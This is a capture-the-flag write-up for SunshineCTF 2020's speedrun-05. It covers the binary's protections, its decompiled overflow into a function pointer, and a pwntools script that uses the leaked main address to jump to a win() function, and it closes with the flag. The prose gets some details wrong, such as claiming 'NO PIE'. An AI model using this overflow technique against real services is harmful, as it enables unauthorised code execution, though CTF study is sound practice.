# **speedrun-05**

## Task
nc chal.2020.sunshinectf.org 30005
File: chall_05
Tag: binary exploitation 

## Solution

### Checksec 
```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
* No canary assume BOF
* System 64 bit

### Decompile with ghidra
```c
void vuln(void)
{
  char local_48 [56];
  code *local_10;
  
  printf("Yes I\'m going to win: %p\n",main);
  fgets(local_48,100,stdin);
  (*local_10)();
  return;
}

void win(void)

{
  system("/bin/sh");
  return;
}
```
Checksec show output is NO PIE but the `printf` leak the server `main`  address so we can utilize that info to compare with our local `main` to caculate the offset gap = `local.main - server.main`, then overwrite `local_10` with server `win` address the we got the flag

### Exploit
```python
from pwn import *
binary = context.binary = ELF('./chall_05')
offset = binary.sym.main - binary.sym.win
payload = b'a'*(0x48-0x10)
p = remote('chal.2020.sunshinectf.org',30005)
p.sendline('lol')
p.recvuntil('Yes I\'m going to win: ')
addr  = p.recvline().strip()
payload += p64(int(addr,16) - offset)
p.sendline(payload)
p.interactive()
```

### Output
```bash
[*] '/home/kali/speedrun_sunshineCTF2020/chall_05'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to chal.2020.sunshinectf.org on port 30005: Done
[*] Switching to interactive mode
$ ls
chall_05
flag.txt
$ cat flag.txt
sun{chapter-four-9ca97769b74345b1}
```
